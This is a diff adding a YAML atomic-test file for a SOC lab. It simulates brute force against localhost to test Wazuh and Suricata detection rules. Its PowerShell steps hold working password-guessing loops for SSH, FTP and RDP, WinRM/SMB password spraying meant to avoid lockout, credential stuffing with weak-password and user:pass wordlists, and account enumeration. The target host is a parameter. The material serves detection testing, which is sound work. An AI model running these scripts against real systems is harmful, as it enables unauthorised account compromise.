@@ -1,0 +1,715 @@
+attack_technique: T1110
+display_name: Brute Force - SSH/FTP/RDP Credential Attack Simulation
+
+description: >
+  Simulates brute force credential attacks against SSH, FTP, and RDP services
+  on localhost using native Windows tools and PowerShell. No external tools
+  (Hydra/Medusa) required - uses built-in commands to generate high-volume
+  failed authentication events for Wazuh frequency rule testing and
+  Suricata signature detection. Covers T1110.001 (Password Guessing),
+  T1110.003 (Password Spraying), and T1110.004 (Credential Stuffing).
+
+author: SOC Lab
+version: 1.0
+platform: windows
+category: credential-access
+severity: high
+mode: simulation
+scope: single-host
+safe: true
+
+mitre_techniques:
+  - T1110.001
+  - T1110.003
+  - T1110.004
+  - T1078
+  - T1021.001
+  - T1021.004
+
+requirements:
+  os: [Windows 10, Windows 11]
+  software: [PowerShell 5.1+, OpenSSH Client (optional), Python 3.x]
+  privileges: [user - no elevation required for most steps]
+  network: [localhost only]
+  pre_run:
+    - Enable OpenSSH Server: Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+    - Enable FTP via IIS or install FileZilla Server on localhost
+    - Enable RDP: Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
+    - Enable Wazuh agent + Sysmon Event 1, 3
+    - Enable auditpol Logon/Logoff + Account Logon: auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+    - Enable Suricata on loopback interface (optional but recommended)
+
+environment:
+  output_dir: C:\Temp\BFLab
+  target_host: 127.0.0.1
+  ssh_port: 22
+  ftp_port: 21
+  rdp_port: 3389
+
+atomic_tests:
+
+# ------------------------------------------------------------------
+# STEP 0 - Setup: create lab directories and wordlists
+# ------------------------------------------------------------------
+- name: '[0] Setup - Create Lab Structure and Wordlists'
+  auto_generated_guid: T1110BF-0000-0000-0000-000000000000
+  description: Create output directory and generate password/username wordlists for brute force steps.
+  supported_platforms: [windows]
+  input_arguments:
+    output_dir:
+      description: Output directory for all lab artifacts
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $base = "#{output_dir}"
+      New-Item -ItemType Directory -Force -Path $base | Out-Null
+
+      # Common password wordlist (top 30 weak passwords)
+      $passwords = @(
+        "password","123456","password123","admin","letmein",
+        "qwerty","abc123","monkey","1234567890","trustno1",
+        "dragon","master","hello","sunshine","shadow",
+        "superman","michael","football","iloveyou","pass123",
+        "welcome","login","admin123","root","toor",
+        "passw0rd","P@ssw0rd","Summer2024","Winter2024","Spring2024"
+      )
+      $passwords | Out-File "$base\passwords.txt" -Encoding UTF8
+      Write-Host ("[+] Password wordlist: {0} entries" -f $passwords.Count)
+
+      # Username wordlist
+      $usernames = @(
+        "administrator","admin","root","user","guest",
+        "test","service","svc","backup","operator",
+        "support","helpdesk","netadmin","sysadmin","manager"
+      )
+      $usernames | Out-File "$base\usernames.txt" -Encoding UTF8
+      Write-Host ("[+] Username wordlist: {0} entries" -f $usernames.Count)
+
+      # Credential pairs for stuffing (user:pass format)
+      $credpairs = @(
+        "admin:admin","admin:password","admin:123456",
+        "administrator:password","administrator:admin123",
+        "root:root","root:toor","root:password",
+        "user:user","user:password","guest:guest"
+      )
+      $credpairs | Out-File "$base\credential_pairs.txt" -Encoding UTF8
+      Write-Host ("[+] Credential pairs: {0} entries" -f $credpairs.Count)
+
+      Write-Host "[+] Lab setup complete: $base"
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{output_dir}" -Recurse -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 1 - T1110.001: SSH Password Guessing (high volume)
+# ------------------------------------------------------------------
+- name: '[1] T1110.001 - SSH Password Guessing (High Volume)'
+  auto_generated_guid: T1110BF-1111-0000-0000-000000000001
+  description: >
+    Generate high-volume failed SSH authentication attempts against localhost.
+    Uses PowerShell TCP connections to port 22 to simulate rapid login attempts.
+    Generates Event ID 4625 (failed logon) burst for Wazuh frequency rule testing.
+    MITRE T1110.001 - Brute Force: Password Guessing.
+  supported_platforms: [windows]
+  input_arguments:
+    target_host:
+      description: Target host
+      type: string
+      default: '127.0.0.1'
+    ssh_port:
+      description: SSH port
+      type: integer
+      default: 22
+    attempt_count:
+      description: Number of login attempts to simulate
+      type: integer
+      default: 50
+    output_dir:
+      description: Output directory
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target  = "#{target_host}"
+      $port    = [int]"#{ssh_port}"
+      $count   = [int]"#{attempt_count}"
+      $outFile = "#{output_dir}\ssh_bruteforce_log.txt"
+      $log     = @()
+
+      Write-Host ("[T1110.001] Starting SSH brute force simulation: {0} attempts -> {1}:{2}" -f $count, $target, $port)
+
+      $passwords = @(
+        "password","123456","admin","letmein","qwerty",
+        "abc123","root","toor","passw0rd","P@ssw0rd",
+        "Summer2024","Winter2024","welcome","admin123","login"
+      )
+
+      $success = 0; $failed = 0
+      for ($i = 1; $i -le $count; $i++) {
+        $pw = $passwords[($i - 1) % $passwords.Count]
+        $user = "admin"
+        try {
+          $tcp = New-Object System.Net.Sockets.TcpClient
+          $tcp.ConnectAsync($target, $port).Wait(300) | Out-Null
+          if ($tcp.Connected) {
+            $tcp.Close()
+            $entry = "ATTEMPT {0:D3}: user={1} pass={2} -> TCP_CONNECTED (auth would fail)" -f $i, $user, $pw
+            $failed++
+          } else {
+            $entry = "ATTEMPT {0:D3}: user={1} pass={2} -> CONNECTION_REFUSED" -f $i, $user, $pw
+          }
+        } catch {
+          $entry = "ATTEMPT {0:D3}: user={1} pass={2} -> ERROR: {3}" -f $i, $user, $pw, $_.Exception.Message
+        }
+        $log += $entry
+        if ($i % 10 -eq 0) { Write-Host ("[T1110.001] Progress: {0}/{1}" -f $i, $count) }
+        Start-Sleep -Milliseconds 100
+      }
+
+      $log | Out-File $outFile -Encoding UTF8
+      Write-Host ("[T1110.001] Done. {0} connection attempts. Log: {1}" -f $count, $outFile)
+
+      # If OpenSSH client available, do real auth attempts (will generate Event 4625)
+      if (Get-Command ssh -ErrorAction SilentlyContinue) {
+        Write-Host "[T1110.001] OpenSSH found - generating real failed auth events..."
+        $realLog = @()
+        foreach ($pw in $passwords[0..9]) {
+          $result = echo $pw | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 `
+            -o PasswordAuthentication=yes -o BatchMode=no `
+            "admin@$target" "exit" 2>&1
+          $realLog += "ssh admin@$target pw=$pw -> $result"
+          Start-Sleep -Milliseconds 200
+        }
+        $realLog | Out-File "$($outFile -replace '\.txt','_real.txt')" -Encoding UTF8
+        Write-Host "[T1110.001] Real auth attempts logged"
+      } else {
+        Write-Host "[T1110.001] OpenSSH client not found - TCP simulation only"
+      }
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{output_dir}\ssh_bruteforce_log*" -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 2 - T1110.001: FTP Password Guessing
+# ------------------------------------------------------------------
+- name: '[2] T1110.001 - FTP Password Guessing'
+  auto_generated_guid: T1110BF-2222-0000-0000-000000000002
+  description: >
+    Generate failed FTP authentication attempts using PowerShell Net.FtpWebRequest.
+    Each attempt generates a distinct FTP 530 (Login incorrect) response.
+    Produces high-volume auth failure events visible in Wazuh FTP rules.
+    MITRE T1110.001 - Brute Force: Password Guessing.
+  supported_platforms: [windows]
+  input_arguments:
+    target_host:
+      description: Target host
+      type: string
+      default: '127.0.0.1'
+    ftp_port:
+      description: FTP port
+      type: integer
+      default: 21
+    attempt_count:
+      description: Number of FTP login attempts
+      type: integer
+      default: 30
+    output_dir:
+      description: Output directory
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target  = "#{target_host}"
+      $port    = [int]"#{ftp_port}"
+      $count   = [int]"#{attempt_count}"
+      $outFile = "#{output_dir}\ftp_bruteforce_log.txt"
+      $log     = @()
+
+      $passwords = @(
+        "password","123456","admin","letmein","qwerty",
+        "abc123","ftp","anonymous","guest","root"
+      )
+      $usernames = @("admin","ftp","anonymous","user","root")
+
+      Write-Host ("[T1110.001-FTP] Starting FTP brute force: {0} attempts -> {1}:{2}" -f $count, $target, $port)
+
+      for ($i = 1; $i -le $count; $i++) {
+        $user = $usernames[($i - 1) % $usernames.Count]
+        $pw   = $passwords[($i - 1) % $passwords.Count]
+        try {
+          $uri = "ftp://${target}:${port}/"
+          $req = [System.Net.FtpWebRequest]::Create($uri)
+          $req.Method      = [System.Net.WebRequestMethods+Ftp]::ListDirectory
+          $req.Credentials = New-Object System.Net.NetworkCredential($user, $pw)
+          $req.Timeout     = 2000
+          $req.KeepAlive   = $false
+          $resp = $req.GetResponse()
+          $entry = "ATTEMPT {0:D3}: {1}:{2} -> SUCCESS" -f $i, $user, $pw
+          $resp.Close()
+        } catch [System.Net.WebException] {
+          $code  = $_.Exception.Response.StatusCode
+          $entry = "ATTEMPT {0:D3}: {1}:{2} -> FAILED ({3})" -f $i, $user, $pw, $code
+        } catch {
+          $entry = "ATTEMPT {0:D3}: {1}:{2} -> ERROR ({3})" -f $i, $user, $pw, $_.Exception.Message
+        }
+        $log += $entry
+        Start-Sleep -Milliseconds 150
+      }
+
+      $log | Out-File $outFile -Encoding UTF8
+      Write-Host ("[T1110.001-FTP] Done. Log: {0}" -f $outFile)
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{output_dir}\ftp_bruteforce_log*" -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 3 - T1110.003: Password Spraying (multiple accounts, one password)
+# ------------------------------------------------------------------
+- name: '[3] T1110.003 - Password Spraying (SMB/WinRM)'
+  auto_generated_guid: T1110BF-3333-0000-0000-000000000003
+  description: >
+    Simulate password spraying: try ONE common password against MANY accounts.
+    Uses Test-WSMan (WinRM) and net use (SMB) to generate auth failures across
+    multiple usernames without triggering per-account lockout thresholds.
+    MITRE T1110.003 - Brute Force: Password Spraying.
+  supported_platforms: [windows]
+  input_arguments:
+    target_host:
+      description: Target host
+      type: string
+      default: '127.0.0.1'
+    spray_password:
+      description: Single password to spray across all accounts
+      type: string
+      default: 'Summer2024'
+    output_dir:
+      description: Output directory
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target   = "#{target_host}"
+      $password = "#{spray_password}"
+      $outFile  = "#{output_dir}\spray_log.txt"
+      $log      = @()
+
+      $usernames = @(
+        "administrator","admin","user","guest","test",
+        "service","backup","operator","support","helpdesk",
+        "netadmin","sysadmin","manager","developer","analyst"
+      )
+
+      Write-Host ("[T1110.003] Password spraying {0} accounts with password: '{1}'" -f $usernames.Count, $password)
+      Write-Host "[T1110.003] Strategy: 1 password per account to avoid lockout"
+
+      # Method 1: WinRM probe (Test-WSMan generates auth event)
+      Write-Host "[T1110.003] Phase 1 - WinRM spray..."
+      foreach ($user in $usernames) {
+        try {
+          $cred = New-Object System.Management.Automation.PSCredential(
+            "$user",
+            (ConvertTo-SecureString $password -AsPlainText -Force)
+          )
+          Test-WSMan -ComputerName $target -Credential $cred -ErrorAction Stop | Out-Null
+          $entry = "SPRAY WINRM: {0}:{1} -> SUCCESS" -f $user, $password
+        } catch {
+          $entry = "SPRAY WINRM: {0}:{1} -> FAILED" -f $user, $password
+        }
+        $log += $entry
+        Write-Host ("  [-] {0}" -f $entry)
+        Start-Sleep -Milliseconds 200
+      }
+
+      # Method 2: SMB net use (generates Security Event 4625)
+      Write-Host "[T1110.003] Phase 2 - SMB spray..."
+      foreach ($user in $usernames[0..4]) {
+        $result = net use "\\$target\IPC$" /user:"$user" "$password" 2>&1
+        $status = if ($LASTEXITCODE -eq 0) { "SUCCESS" } else { "FAILED" }
+        $entry  = "SPRAY SMB: {0}:{1} -> {2}" -f $user, $password, $status
+        $log   += $entry
+        Write-Host ("  [-] {0}" -f $entry)
+        net use "\\$target\IPC$" /delete 2>$null | Out-Null
+        Start-Sleep -Milliseconds 300
+      }
+
+      $log | Out-File $outFile -Encoding UTF8
+      Write-Host ("[T1110.003] Spray complete. {0} attempts. Log: {1}" -f $log.Count, $outFile)
+      exit 0
+  cleanup_command: |
+    net use * /delete /yes 2>$null
+    Remove-Item "#{output_dir}\spray_log*" -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 4 - T1110.004: Credential Stuffing (known breach pairs)
+# ------------------------------------------------------------------
+- name: '[4] T1110.004 - Credential Stuffing'
+  auto_generated_guid: T1110BF-4444-0000-0000-000000000004
+  description: >
+    Simulate credential stuffing using pre-built user:password pairs
+    (mimicking leaked credential databases). Tests against WinRM and SMB.
+    Distinct from spraying: each account gets its specific known password.
+    MITRE T1110.004 - Brute Force: Credential Stuffing.
+  supported_platforms: [windows]
+  input_arguments:
+    target_host:
+      description: Target host
+      type: string
+      default: '127.0.0.1'
+    output_dir:
+      description: Output directory
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target  = "#{target_host}"
+      $outFile = "#{output_dir}\stuffing_log.txt"
+      $log     = @()
+
+      # Simulated breach credential pairs (user:password from known leaks)
+      $credPairs = @(
+        @{user="admin";     pass="admin"},
+        @{user="admin";     pass="password"},
+        @{user="admin";     pass="123456"},
+        @{user="administrator"; pass="password"},
+        @{user="administrator"; pass="admin123"},
+        @{user="root";      pass="root"},
+        @{user="root";      pass="toor"},
+        @{user="user";      pass="user"},
+        @{user="user";      pass="password123"},
+        @{user="guest";     pass="guest"},
+        @{user="test";      pass="test"},
+        @{user="service";   pass="service123"}
+      )
+
+      Write-Host ("[T1110.004] Credential stuffing: {0} breach pairs -> {1}" -f $credPairs.Count, $target)
+
+      foreach ($cred in $credPairs) {
+        $u = $cred.user; $p = $cred.pass
+        try {
+          $secPw = ConvertTo-SecureString $p -AsPlainText -Force
+          $psCred = New-Object System.Management.Automation.PSCredential($u, $secPw)
+          Test-WSMan -ComputerName $target -Credential $psCred -ErrorAction Stop | Out-Null
+          $entry = "STUFF: {0}:{1} -> SUCCESS (valid credential found)" -f $u, $p
+          Write-Host ("[!] HIT: $entry")
+        } catch {
+          $entry = "STUFF: {0}:{1} -> FAILED" -f $u, $p
+          Write-Host ("  [-] {0}" -f $entry)
+        }
+        $log += $entry
+        Start-Sleep -Milliseconds 250
+      }
+
+      $log | Out-File $outFile -Encoding UTF8
+      Write-Host ("[T1110.004] Done. Log: {0}" -f $outFile)
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{output_dir}\stuffing_log*" -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 5 - T1110.001: RDP Brute Force Simulation
+# ------------------------------------------------------------------
+- name: '[5] T1110.001 - RDP Brute Force Simulation'
+  auto_generated_guid: T1110BF-5555-0000-0000-000000000005
+  description: >
+    Simulate RDP brute force by probing port 3389 and generating
+    Windows Security Event 4625 (Logon Type 10 - RemoteInteractive).
+    Uses cmdkey to attempt credential storage then mstsc /v to probe.
+    MITRE T1110.001 - Brute Force: Password Guessing (RDP).
+  supported_platforms: [windows]
+  input_arguments:
+    target_host:
+      description: Target host
+      type: string
+      default: '127.0.0.1'
+    rdp_port:
+      description: RDP port
+      type: integer
+      default: 3389
+    attempt_count:
+      description: Number of RDP probe attempts
+      type: integer
+      default: 20
+    output_dir:
+      description: Output directory
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $target  = "#{target_host}"
+      $port    = [int]"#{rdp_port}"
+      $count   = [int]"#{attempt_count}"
+      $outFile = "#{output_dir}\rdp_bruteforce_log.txt"
+      $log     = @()
+
+      $passwords = @(
+        "password","123456","admin","letmein",
+        "qwerty","abc123","P@ssw0rd","Summer2024",
+        "welcome","admin123"
+      )
+
+      Write-Host ("[T1110.001-RDP] RDP brute force simulation: {0} attempts -> {1}:{2}" -f $count, $target, $port)
+
+      # Phase 1: TCP port probe to confirm RDP is listening
+      $rdpOpen = $false
+      try {
+        $conn = Test-NetConnection $target -Port $port -WarningAction SilentlyContinue
+        $rdpOpen = $conn.TcpTestSucceeded
+        Write-Host ("[T1110.001-RDP] Port {0} open: {1}" -f $port, $rdpOpen)
+      } catch {}
+
+      # Phase 2: cmdkey credential attempts (generates auth failure events)
+      for ($i = 1; $i -le $count; $i++) {
+        $user = "administrator"
+        $pw   = $passwords[($i - 1) % $passwords.Count]
+        try {
+          # Store credential (generates auth probe)
+          cmdkey /generic:"$target" /user:"$user" /pass:"$pw" 2>&1 | Out-Null
+          # Attempt connection with timeout (will fail auth, generates Event 4625)
+          $proc = Start-Process mstsc -ArgumentList "/v:$target /w:640 /h:480" -PassThru
+          Start-Sleep -Milliseconds 500
+          if (-not $proc.HasExited) { $proc.Kill() }
+          $entry = "ATTEMPT {0:D3}: {1}:{2} -> AUTH_PROBE_SENT" -f $i, $user, $pw
+        } catch {
+          $entry = "ATTEMPT {0:D3}: {1}:{2} -> ERROR: {3}" -f $i, $user, $pw, $_.Exception.Message
+        }
+        # Clean up stored credential
+        cmdkey /delete:"$target" 2>&1 | Out-Null
+        $log += $entry
+        if ($i % 5 -eq 0) { Write-Host ("[T1110.001-RDP] Progress: {0}/{1}" -f $i, $count) }
+        Start-Sleep -Milliseconds 300
+      }
+
+      $log | Out-File $outFile -Encoding UTF8
+      Write-Host ("[T1110.001-RDP] Done. Log: {0}" -f $outFile)
+      exit 0
+  cleanup_command: |
+    cmdkey /delete:"#{target_host}" 2>$null
+    Remove-Item "#{output_dir}\rdp_bruteforce_log*" -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 6 - T1078: Valid Account Discovery (post-bruteforce)
+# ------------------------------------------------------------------
+- name: '[6] T1078 - Valid Account Enumeration (post-bruteforce recon)'
+  auto_generated_guid: T1110BF-6666-0000-0000-000000000006
+  description: >
+    After brute force, simulate attacker enumerating valid local accounts
+    to focus further attacks. Uses net user and Get-LocalUser.
+    MITRE T1078 - Valid Accounts (Discovery phase after credential attack).
+  supported_platforms: [windows]
+  input_arguments:
+    output_dir:
+      description: Output directory
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $outFile = "#{output_dir}\account_enum.txt"
+      $log     = @()
+
+      Write-Host "[T1078] Enumerating local accounts..."
+
+      # Method 1: net user
+      $log += "=== net user ==="
+      $log += (net user 2>&1)
+
+      # Method 2: Get-LocalUser (PowerShell)
+      $log += "`n=== Get-LocalUser ==="
+      try {
+        $users = Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordRequired
+        $users | ForEach-Object {
+          $log += ("  {0,-20} Enabled={1} LastLogon={2}" -f $_.Name, $_.Enabled, $_.LastLogon)
+        }
+      } catch {
+        $log += "Get-LocalUser failed: $_"
+      }
+
+      # Method 3: LDAP/WMI query
+      $log += "`n=== WMI Win32_UserAccount ==="
+      Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True" |
+        Select-Object Name, Disabled, Lockout, PasswordRequired |
+        ForEach-Object {
+          $log += ("  {0,-20} Disabled={1} Lockout={2}" -f $_.Name, $_.Disabled, $_.Lockout)
+        }
+
+      $log | Out-File $outFile -Encoding UTF8
+      Write-Host ("[T1078] Account enum saved: {0}" -f $outFile)
+      exit 0
+  cleanup_command: |
+    Remove-Item "#{output_dir}\account_enum*" -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 7 - Burst Mode: rapid failed logins for Wazuh frequency testing
+# ------------------------------------------------------------------
+- name: '[7] Burst Mode - Rapid Auth Failures (Wazuh Frequency Rule Test)'
+  auto_generated_guid: T1110BF-7777-0000-0000-000000000007
+  description: >
+    Generate 100 failed authentication events in rapid succession specifically
+    to trigger Wazuh frequency-based detection rules (e.g., >10 failures in 60s).
+    Uses Windows Security logon API via PowerShell to generate real Event 4625.
+    This is the most direct test for Wazuh rule: frequency > threshold.
+    MITRE T1110.001 - Brute Force: Password Guessing (burst pattern).
+  supported_platforms: [windows]
+  input_arguments:
+    burst_count:
+      description: Number of rapid failed auth attempts
+      type: integer
+      default: 100
+    delay_ms:
+      description: Delay between attempts in milliseconds
+      type: integer
+      default: 50
+    output_dir:
+      description: Output directory
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $count   = [int]"#{burst_count}"
+      $delay   = [int]"#{delay_ms}"
+      $outFile = "#{output_dir}\burst_log.txt"
+      $log     = @()
+      $startTime = Get-Date
+
+      Write-Host ("[T1110-BURST] Generating {0} rapid auth failures (delay: {1}ms)" -f $count, $delay)
+      Write-Host "[T1110-BURST] This will trigger Wazuh frequency rules..."
+
+      # Use Add-Type to call LogonUser API (generates real Event 4625)
+      Add-Type -TypeDefinition @'
+      using System;
+      using System.Runtime.InteropServices;
+      public class AuthSim {
+        [DllImport("advapi32.dll", SetLastError=true)]
+        public static extern bool LogonUser(
+          string lpszUsername, string lpszDomain, string lpszPassword,
+          int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+        [DllImport("kernel32.dll", SetLastError=true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+      }
+      '@
+
+            $success = 0; $failed = 0
+            for ($i = 1; $i -le $count; $i++) {
+              $user = "nonexistent_user_$i"
+              $pw   = "wrong_password_$i"
+              $token = [IntPtr]::Zero
+              try {
+                $result = [AuthSim]::LogonUser($user, ".", $pw, 2, 0, [ref]$token)
+                if ($result) {
+                  [AuthSim]::CloseHandle($token) | Out-Null
+                  $success++
+                  $log += "BURST {0:D3}: {1} -> SUCCESS (unexpected)" -f $i, $user
+                } else {
+                  $failed++
+                  $log += "BURST {0:D3}: {1} -> FAILED (Event 4625 generated)" -f $i, $user
+                }
+              } catch {
+                $log += "BURST {0:D3}: ERROR - {1}" -f $i, $_.Exception.Message
+              }
+              if ($i % 25 -eq 0) {
+                $elapsed = (Get-Date) - $startTime
+                Write-Host ("[T1110-BURST] {0}/{1} attempts in {2:N1}s" -f $i, $count, $elapsed.TotalSeconds)
+              }
+              Start-Sleep -Milliseconds $delay
+            }
+
+            $elapsed = (Get-Date) - $startTime
+            $summary = "BURST COMPLETE: {0} attempts, {1} failed, {2} success, {3:N1}s elapsed, {4:N1} attempts/sec" `
+              -f $count, $failed, $success, $elapsed.TotalSeconds, ($count / $elapsed.TotalSeconds)
+            Write-Host ("[T1110-BURST] {0}" -f $summary)
+            $log += $summary
+            $log | Out-File $outFile -Encoding UTF8
+            exit 0
+  cleanup_command: |
+    Remove-Item "#{output_dir}\burst_log*" -Force -ErrorAction SilentlyContinue
+
+
+# ------------------------------------------------------------------
+# STEP 8 - Cleanup: remove all lab artifacts
+# ------------------------------------------------------------------
+- name: '[8] Cleanup - Remove All Lab Artifacts'
+  auto_generated_guid: T1110BF-8888-0000-0000-000000000008
+  description: Remove all output files, clear stored credentials, disconnect SMB shares.
+  supported_platforms: [windows]
+  input_arguments:
+    output_dir:
+      description: Output directory to clean
+      type: string
+      default: 'C:\Temp\BFLab'
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      # Clear stored credentials
+      cmdkey /list 2>$null | Select-String "127.0.0.1" | ForEach-Object {
+        cmdkey /delete:"127.0.0.1" 2>$null
+      }
+
+      # Disconnect SMB shares
+      net use * /delete /yes 2>$null | Out-Null
+
+      # Remove output directory
+      $base = "#{output_dir}"
+      if (Test-Path $base) {
+        $files = (Get-ChildItem $base -File).Count
+        Remove-Item $base -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Host ("[Cleanup] Removed {0} files from {1}" -f $files, $base)
+      }
+      Write-Host "[Cleanup] Done."
+      exit 0
+
+
+post_conditions:
+  files_created:
+    - 'C:\Temp\BFLab\passwords.txt'
+    - 'C:\Temp\BFLab\usernames.txt'
+    - 'C:\Temp\BFLab\credential_pairs.txt'
+    - 'C:\Temp\BFLab\ssh_bruteforce_log.txt'
+    - 'C:\Temp\BFLab\ftp_bruteforce_log.txt'
+    - 'C:\Temp\BFLab\spray_log.txt'
+    - 'C:\Temp\BFLab\stuffing_log.txt'
+    - 'C:\Temp\BFLab\rdp_bruteforce_log.txt'
+    - 'C:\Temp\BFLab\account_enum.txt'
+    - 'C:\Temp\BFLab\burst_log.txt'
+  windows_events:
+    - 'Event 4625 (Failed Logon): burst from step 7, SSH/FTP/RDP from steps 1-5'
+    - 'Event 4624 (Successful Logon): if any credential matches'
+    - 'Event 4776 (NTLM Auth): from SMB spray step 3'
+    - 'Event 4688 (Process Create): mstsc.exe, net.exe, cmdkey.exe'
+  sysmon_events:
+    - 'Event 1 (ProcessCreate): net.exe, cmdkey.exe, mstsc.exe, ssh.exe'
+    - 'Event 3 (NetworkConnect): TCP to 127.0.0.1:22, :21, :3389, :5985, :445'
+  wazuh_alerts:
+    - 'Multiple failed logons - HIGH (T1110.001) - frequency rule triggers at >10/60s'
+    - 'Password spraying pattern - HIGH (T1110.003) - multiple accounts same password'
+    - 'Credential stuffing attempt - HIGH (T1110.004)'
+    - 'RDP brute force detected - HIGH (T1110.001) - Logon Type 10 failures'
+    - 'Account enumeration - MEDIUM (T1078)'
+    - 'BURST: >50 Event 4625 in <60s - CRITICAL - frequency rule'
+  suricata_alerts:
+    - 'ET SCAN SSH BruteForce attempt - rapid TCP to port 22'
+    - 'ET POLICY FTP Login Failure - repeated 530 responses'
+    - 'ET SCAN RDP failed auth - port 3389 rapid connections'
